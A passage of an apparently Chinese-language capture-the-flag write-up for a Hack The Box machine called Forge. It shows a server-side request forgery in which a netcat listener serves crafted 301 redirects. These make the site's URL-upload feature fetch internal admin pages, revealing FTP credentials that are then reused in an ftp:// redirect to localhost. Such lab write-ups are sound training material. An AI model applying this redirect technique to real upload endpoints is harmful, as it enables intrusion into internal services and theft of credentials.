class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/upload&quot;</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>                Upload local file<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_remote_file()&quot;</span>&gt;</span><br>                Upload from url<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span><br>                <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>File uploaded successfully to the following url:<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://forge.htb/uploads/DQuTt1inycz1YMpIzYpr&quot;</span>&gt;</span>http://forge.htb/uploads/DQuTt1inycz1YMpIzYpr<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>13、我们请求下这个地址，看看显示的内容是什么</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl http://forge.htb/uploads/DQuTt1inycz1YMpIzYpr                            <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Admin Portal<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Portal home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right margin-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/announcements&quot;</span>&gt;</span>Announcements<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/upload&quot;</span>&gt;</span>Upload image<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome Admins!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>14、通过查看这个返回信息，我们知道了 admin.forge.htb 是有个 &#x2F;announcements 目录的，我们修改下跳转内容，再继续访问下看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ vim response-301 <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> response-301 <br>HTTP/1.1 301 Moved Permanently<br>Date: Fri, 26 Jan 2024 06:56:12 GMT<br>Server: Apache/2.4.41 (Ubuntu)<br>Location: http://admin.forge.htb/announcements<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 80 &lt; response-301<br>listening on [any] 80 ...<br>connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 52074<br>GET / HTTP/1.1<br>Host: 10.10.14.6<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: keep-alive<br><br>^C<br></code></pre></td></tr></table></figure>
+
+<p>15、继续请求下查看下内容</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -X POST -d &#x27;url=http%3A%2F%2F10.10.14.6&amp;remote=1&#x27; http://forge.htb/upload<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/upload.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Gallery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/upload&quot;</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>                Upload local file<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_remote_file()&quot;</span>&gt;</span><br>                Upload from url<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span><br>                <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>File uploaded successfully to the following url:<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://forge.htb/uploads/D4L2zhsiUKRdtOLW392o&quot;</span>&gt;</span>http://forge.htb/uploads/D4L2zhsiUKRdtOLW392o<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>16、请求下生成的这个地址</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl http://forge.htb/uploads/D4L2zhsiUKRdtOLW392o                            <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Announcements<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/announcements.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Portal home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right margin-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/announcements&quot;</span>&gt;</span>Announcements<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/upload&quot;</span>&gt;</span>Upload image<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="hljs-symbol">&amp;lt;</span>url<span class="hljs-symbol">&amp;gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>17、这里其实我们发现了个ftp的账号密码信息</p>
+<p><code>user:heightofsecurity123!</code></p>
+<p>18、那这里就根据提示，设置下访问ftp地址，看看里面有什么内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ vim response-301<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> response-301 <br>HTTP/1.1 301 Moved Permanently<br>Date: Fri, 26 Jan 2024 06:56:12 GMT<br>Server: Apache/2.4.41 (Ubuntu)<br>Location: http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 80 &lt; response-301<br>listening on [any] 80 ...<br>connect to [10.10.14.6] from (UNKNOWN) [10.10.11.111] 52150<br>GET / HTTP/1.1<br>Host: 10.10.14.6<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Connection: keep-alive<br><br>^C<br></code></pre></td></tr></table></figure>
+
+<p>19、开始发送请求</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ curl -X POST -d &#x27;url=http%3A%2F%2F10.10.14.6&amp;remote=1&#x27; http://forge.htb/upload<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/main.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/static/css/upload.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/js/main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>Gallery<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;align-right&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/upload&quot;</span>&gt;</span>Upload an image<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_local_file()&quot;</span>&gt;</span><br>                Upload local file<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;show_upload_remote_file()&quot;</span>&gt;</span><br>                Upload from url<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span><br>                <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>File uploaded successfully to the following url:<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://forge.htb/uploads/mLyuNrvfVuk1JannEoWN&quot;</span>&gt;</span>http://forge.htb/uploads/mLyuNrvfVuk1JannEoWN<span 